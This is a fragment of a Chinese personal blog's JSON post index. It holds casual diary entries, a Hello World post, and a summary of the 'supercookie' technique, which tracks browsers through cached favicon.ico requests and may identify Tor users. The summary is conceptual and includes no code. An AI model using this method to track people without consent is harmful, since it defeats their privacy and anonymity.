https://supercookie.me/workwise\n","permalink":"https://killdayu.com/posts/supercookie/","summary":"我草这个有点🐮，Google翻译看着有点头疼，原理大概就是浏览器会缓存网站的favicon.ico，然后缓存到的favicon.ico再次刷新网页的时候不会重新请求。服务器会在首次访问时创建多个路由（这样才能实现区分多个不同客户端），然后随机将一些路由的favicon.ico设置成200，同时按照路由的favicon.ico生成一个id。客户端再次刷新时由于缓存了某些路由之前的favicon.ico，就只会去请求之前404的favicon.ico，服务器就能得到404的favicon.ico请求然后还原出客户端的id。相当于实现了一个cookie，其实id的实习都源于浏览器的请求，所以代理这些网络层面的都隐藏不了。但是我试了下最新的Chrome失效了😋。但是貌似之前的Firefox中招了，Tor就是魔改的Firefox，也不知道有没有继承缓存favicon.ico这个特性😋，暗网不再暗网😋。一切特征都是supercookie😋。 https://github.com/jonasstrehle/supercookie https://supercookie.me/workwise","title":"Supercookie"},{"content":"好久不见，冒个泡，我只是废物。\n","permalink":"https://killdayu.com/posts/2022.6.3/","summary":"好久不见，冒个泡，我只是废物。","title":"2022.6.3"},{"content":"今早6点多才睡，因为手机快没电了。下午竟然1点多就醒了，然后看了下社区微信群，今天核酸下午4点就停了，之前明明是晚上9点，然后下午5点。。。。然后就不想去了，躺在床上纠结到了3点半，唉还是去吧，不然搞弹窗了又是一堆事，影响我周末躺平。测了下app的抓包，貌似发现了新的tips。凌晨刷知乎刷到了绝命毒师，感觉还不错，今晚开始刷剧。。。\n","permalink":"https://killdayu.com/posts/2022.5.13/","summary":"今早6点多才睡，因为手机快没电了。下午竟然1点多就醒了，然后看了下社区微信群，今天核酸下午4点就停了，之前明明是晚上9点，然后下午5点。。。。然后就不想去了，躺在床上纠结到了3点半，唉还是去吧，不然搞弹窗了又是一堆事，影响我周末躺平。测了下app的抓包，貌似发现了新的tips。凌晨刷知乎刷到了绝命毒师，感觉还不错，今晚开始刷剧。。。","title":"2022.5.13"},{"content":"print(\u0026#34;Hello World!\u0026#34;) ","permalink":"https://killdayu.com/posts/hello_world/","summary":"print(\u0026#34;Hello World!\u0026#34;) ","title":"Hello_World"}]